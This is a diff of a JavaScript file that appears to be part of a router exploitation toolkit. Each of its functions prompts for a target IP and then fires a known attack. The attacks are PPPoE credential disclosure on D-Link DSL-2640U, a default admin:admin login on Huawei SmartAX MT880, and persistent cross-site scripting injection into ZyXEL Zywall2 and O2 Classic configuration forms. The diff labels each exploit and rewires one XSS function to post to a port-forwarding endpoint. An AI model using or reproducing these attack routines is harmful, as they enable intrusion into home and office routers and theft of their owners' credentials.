@@ -1294,6 +1294,7 @@ function DSL2640Br() {
 	}
 }
 
+// D-Link DSL-2640U PPoE Data Disclosure (ADSL Router)
 function ff2640U(){
 	ip=prompt("IP:");
 	document.f2640U.action="http://"+ip+"/wizisp.cgi?quick=1&sntpRefresh=0&wizTmpSntpEnable=0&wizTmpDST=0";
@@ -1302,7 +1303,8 @@ function ff2640U(){
 	}
 }
 
-function  ff1500WG(){
+// Not used
+function ff1500WG(){
 	ip=prompt("IP:");
 	document.f1500WG.action="http://"+ip+"/m_atminttemp11.stm";
 	if (ip==null || ip==""){}else{
@@ -1310,6 +1312,7 @@ function  ff1500WG(){
 	}
 }
 
+// Not used
 function singwiredosr() {
 	ip=prompt("IP:");
 	document.singwiredos.action="http://"+ip+"/xslt";
@@ -1318,12 +1321,15 @@ function singwiredosr() {
 	}
 }
 
+// Huawei SmartAX MT880 default password
 function setipadminadmin() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
 		document.location="http://admin:admin@"+ip;
 	}
 }
+
+// ZyXEL Zywall2 Persistent Cross Site Scripting
 function zyxelxss() {
 	dom=prompt("Domain:");
 	document.zyxelxss.sysDomainname.value=dom;
@@ -1331,20 +1337,6 @@ function zyxelxss() {
 	document.zyxelxss.sysSystemname.value=xss;
 	if (dom==null || dom==""){}else{
 		document.zyxelxss.submit();
-	}
-}
-function zyxelxssp() {
-	xss=getxss();
-	document.zyxelxssp.PortRule_Name.value=xss;
-	if (xss==null || xss==""){}else{
-		document.zyxelxssp.submit();
-	}
-}
-function zyxelxsspr() {
-	xss=getxss();
-	document.zyxelxssp.PortRule_Name.value=xss;
-	if (xss==null || Xss==""){}else{
-		document.zyxelxssp.submit();
 	}
 }
 function zyxelxssr() {
@@ -1358,6 +1350,25 @@ function zyxelxssr() {
 		document.zyxelxss.submit();
 	}
 }
+
+// ZyXEL O2 Classic persistent cross site scripting
+function zyxelxssp() {
+	xss=getxss();
+	document.zyxelxssp.PortRule_Name.value=xss;
+	if (xss==null || xss==""){}else{
+		document.zyxelxssp.submit();
+	}
+}
+function zyxelxsspr() {
+	ip=prompt("IP:");
+	xss=getxss();
+	document.zyxelxssp.PortRule_Name.value=xss;
+	document.zyxelxssp.action="http://"+ip+"/Forms/PortForwarding_Edit_1";
+	if (xss==null || Xss==""){}else{
+		document.zyxelxssp.submit();
+	}
+}
+
 function zyxeldefault() {
 	ip=prompt("IP:");
 	if (ip==null || ip==""){}else{
